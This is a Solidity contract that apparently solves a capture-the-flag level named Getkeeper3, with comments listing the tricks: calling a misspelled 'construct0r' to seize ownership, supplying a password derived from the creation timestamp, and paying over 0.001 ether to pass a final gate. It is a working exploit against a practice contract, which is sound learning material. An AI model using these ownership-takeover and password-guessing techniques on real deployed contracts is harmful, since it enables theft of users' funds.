// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Gate 1: constructor is spelled wrong, just init yourself
// Gate 2: getAllowance by guessing the password, which is the timeblock of the contract creation, ignore trickytrick(), it's bait
// Gate 3: the gatekeeper needs > 0.001 but the owner must not have a receive/fallback

contract Getkeeper3 {

    address level = 0x9019117Bef7C3e83cFd14c6Ee71034A4F10592B2;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);
    event TestAddr(address);
    
    function init() external {

        bytes memory payload = abi.encodeWithSignature("construct0r()");
        (bool success, ) = level.call(payload);
        emit TestBool(success);

        payload = abi.encodeWithSignature("createTrick()");
        (success, ) = level.call(payload);
        emit TestBool(success);
    }

    function pwn(uint256 password) external payable {

        bytes memory payload = abi.encodeWithSignature("getAllowance(uint256)", password);
        (bool success, ) = level.call(payload);
        emit TestBool(success);

        payable(level).transfer(msg.value);

        payload = abi.encodeWithSignature("enter()");
        (success, ) = level.call(payload);
        emit TestBool(success);
    }
}